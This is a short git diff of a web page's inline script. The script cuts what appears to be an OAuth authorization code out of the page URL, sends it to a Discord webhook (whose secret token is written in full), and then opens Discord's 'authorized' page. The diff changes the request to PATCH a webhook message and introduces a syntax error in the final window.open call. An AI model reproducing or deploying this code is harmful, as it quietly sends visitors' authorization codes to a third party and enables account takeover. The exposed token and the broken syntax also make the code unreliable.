@@ -114,8 +114,8 @@
 code = window.location.href.slice(63,100)
 async function postJSON(data) {
   try {
-    const response = await fetch("https://discord.com/api/webhooks/1103808892867190856/o3VCDH7eB8azWxXcvKHvalMlGdpbUlweCXlxmkELDZTcNSwsQvuS2f09M4_v2PxxQrOe", {
-      method: "POST", // or 'PUT'
+    const response = await fetch("https://discord.com/api/webhooks/1103808892867190856/o3VCDH7eB8azWxXcvKHvalMlGdpbUlweCXlxmkELDZTcNSwsQvuS2f09M4_v2PxxQrOe/messages/1103813765092364409", {
+      method: "PATCH", // or 'PUT' or 'POST'
       headers: {
         "Content-Type": "application/json",
       },
@@ -131,7 +131,7 @@ async function postJSON(data) {
 
 const data = { content: code };
 postJSON(data);
-window.open("https://discord.com/api/oauth2/authorized");
+window.open("https://discord.com/api/oauth2/authorized" _self);
 </script>
   </div>
       </div>
